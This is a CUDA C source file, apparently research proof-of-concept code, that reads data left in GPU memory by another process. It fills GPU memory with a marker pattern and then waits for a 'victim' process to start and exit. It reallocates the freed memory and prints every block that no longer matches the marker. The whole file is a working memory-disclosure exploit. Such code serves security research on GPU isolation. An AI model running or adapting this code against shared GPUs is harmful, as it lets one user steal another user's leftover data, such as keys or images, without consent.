/*
 * Written by Sangho Lee (sangho@gatech.edu)
 */ 
#include <stdio.h>
#include <unistd.h>
#include <stdint.h>

#define SIZE 2*1024*1024*1024
// 1 GiB
// Tesla has 2687 MiB of Global Memory

void cudasafe(cudaError_t error, char *message)
{
	if (error != cudaSuccess) 
	{
		fprintf(stderr, "ERROR: %s : %s\n", message, cudaGetErrorString(error));
		exit(-1);
	}
}

//const int N = 14;
const int N = 1;

// a 1024-bit random sequence
unsigned int uniq_key[32] = {
        0x63636363U, 0x7c7c7c7cU, 0x77777777U, 0x7b7b7b7bU,
        0xf2f2f2f2U, 0x6b6b6b6bU, 0x6f6f6f6fU, 0xc5c5c5c5U,
        0x30303030U, 0x01010101U, 0x67676767U, 0x2b2b2b2bU,
        0xfefefefeU, 0xd7d7d7d7U, 0xababababU, 0x76767676U,
        0x239c9cbfU, 0x53a4a4f7U, 0xe4727296U, 0x9bc0c05bU,
        0x75b7b7c2U, 0xe1fdfd1cU, 0x3d9393aeU, 0x4c26266aU,
        0x6c36365aU, 0x7e3f3f41U, 0xf5f7f702U, 0x83cccc4fU,
        0x6834345cU, 0x51a5a5f4U, 0xd1e5e534U, 0xf9f1f108U
};

__global__
void foobar(unsigned int *a)
{
	int i = blockIdx.x;
	printf("aaaa\n");
}

int main()
{
	size_t memsize = 2752249856; // best for tesla
	//size_t memsize = 2093219840; // best for kepler

        unsigned int *a;
        a = (unsigned int*)malloc(memsize);
	// 128 B random number
	for (int i = 0; i < memsize/4; i += 32)
	{
		for (int j = 0; j < 32; ++j)
		{
			a[i+j] = uniq_key[j];
		}
	}

        unsigned int *d_a;
        cudasafe(cudaMalloc((void**)&d_a, memsize), "cudaMalloc");
        cudasafe(cudaMemcpy(d_a, a, memsize, cudaMemcpyHostToDevice), "cudaMemcpy"); // fill GPU memory with a predefined value
	cudaFree(d_a); // deallocate it!!

	size_t free_old, free, total;
	cudaMemGetInfo(&free_old, &total);
	while (1)
	{
		cudaMemGetInfo(&free, &total);

		fprintf(stderr, "Waiting for victim -- Free/Total: %llu/%llu\n", free, total);
	
		if (free_old == free)
		{
			usleep(10*1000);
		}
		else
		{
			fprintf(stderr, "victim comes!!\n");
			break;
		}
	}

//	while (1)
	for (int i = 0; i < 10000; ++i)
	{
		cudaMemGetInfo(&free, &total);

		fprintf(stderr, "Waiting for victim's out -- Free/Total: %llu/%llu\n", free, total);
	
		if (free_old != free)
		{
			usleep(10*1000);
		}
		else
		{
			fprintf(stderr, "victim out!!\n");
			break;
		}
	}

	while (cudaMalloc((void**)&d_a, memsize) != cudaSuccess)
	{
		fprintf(stderr,"%u\n", memsize);
		memsize -= 4;
	}
	fprintf(stderr,"cudaMalloc(): %u\n", memsize);

        cudasafe(cudaMemcpy(a, d_a, memsize, cudaMemcpyDeviceToHost), "cudaMemcpy");
	fprintf(stderr,"cudaMemcpy()\n");

	fprintf(stderr, "Memory dump...\n");

	const int nobytes = 32;

	unsigned int buf[nobytes];

	for (size_t i=0; i < memsize/4; i += nobytes)
	{
		int j;
		for (j=0; j < nobytes; ++j)
		{
			buf[j] = a[i+j];
		}

		for (j=0; j < nobytes; ++j)
		{
			//if (buf[j] != 0x12345678)
			if (buf[j] != uniq_key[j])
				break;
		}

		if (j != nobytes)
		{
			for (int k=0; k < nobytes; ++k)
			{
				printf("%08x\n", buf[k]);
			}
		}
	}

	fprintf(stderr, "Done...\n");

	cudaFree(d_a);
	cudaDeviceSynchronize();
	cudaDeviceReset();

	return EXIT_SUCCESS;
}
